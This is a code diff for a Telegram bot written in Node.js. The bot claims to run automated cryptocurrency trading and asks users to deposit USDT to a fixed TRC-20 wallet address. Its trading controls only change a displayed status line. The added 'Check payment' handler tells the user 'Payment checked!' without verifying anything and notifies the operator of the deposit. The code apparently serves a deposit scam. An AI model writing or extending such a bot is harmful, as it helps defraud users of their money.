@@ -9,7 +9,7 @@ const bot = new TelegramBot(token, { polling: true });
 
 const dataFile = 'data.txt';
 
-// Helper functions
+// Fonctions d'aide
 const getUserData = (chatId) => {
   const data = fs.readFileSync(dataFile, 'utf8').split('\n').filter(Boolean);
   const user = data.find(line => line.startsWith(`${chatId}:`));
@@ -40,7 +40,7 @@ const initializeUser = async (chatId) => {
   }
 };
 
-// Bot Commands
+// Commandes du bot
 bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   await initializeUser(chatId);
@@ -85,7 +85,7 @@ bot.on('message', (msg) => {
     const tradingMessage = `Trading 
 "Stop trading / Start trading" - starting and stopping the trading bot.
 "Trading bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
-        
+
 Trading status: Stopped 🚫`;
 
     const inlineKeyboard = {
@@ -122,7 +122,6 @@ Trading status: Stopped 🚫`;
 The transfer is realized automatically.
 
 ❗️ The minimum amount for replenishment is 20 USDT
-
 ➖➖➖➖➖
 Wallet address USDT TRC-20:
 \`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\`
@@ -135,6 +134,10 @@ Wallet address USDT TRC-20:
         ]
       }
     };
+
+    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
+    const adminMessage = `New deposit: ${chatId}`;
+    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
 
     bot.sendMessage(chatId, depositMessage, inlineKeyboard);
   } else if (text === 'Withdrawal') {
@@ -169,7 +172,7 @@ bot.on('callback_query', async (callbackQuery) => {
   } else if (data === 'start_trading') {
     const tradingMessage = `Stop trading / Start trading" - starting and stopping the trading bot.
 "Trading bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
-        
+
 Trading status: ACTIVE ✅️`;
 
     const inlineKeyboard = {
@@ -186,7 +189,7 @@ Trading status: ACTIVE ✅️`;
   } else if (data === 'stop_trading') {
     const tradingMessage = `Stop trading / Start trading" - starting and stopping the trading bot.
 "Trading bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
-        
+
 Trading status: Stopped 🚫`;
 
     const inlineKeyboard = {
@@ -207,3 +210,25 @@ Trading status: Stopped 🚫`;
 The transfer is realized automatically.
 
 ❗️ The minimum amount for replenishment is 20 USDT
+➖➖➖➖➖
+Wallet address USDT TRC-20:
+\`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\`
+(To copy, click on the wallet👆)`;
+
+    const inlineKeyboard = {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: 'Check payment', callback_data: 'check_payment' }]
+        ]
+      }
+    };
+
+    bot.sendMessage(chatId, depositMessage, inlineKeyboard);
+  } else if (data === 'check_payment') {
+    bot.sendMessage(chatId, 'Payment checked!'); // Placeholder message for payment check
+    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
+    const adminMessage = `New deposit: ${chatId}`;
+    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
+  }
+});
+
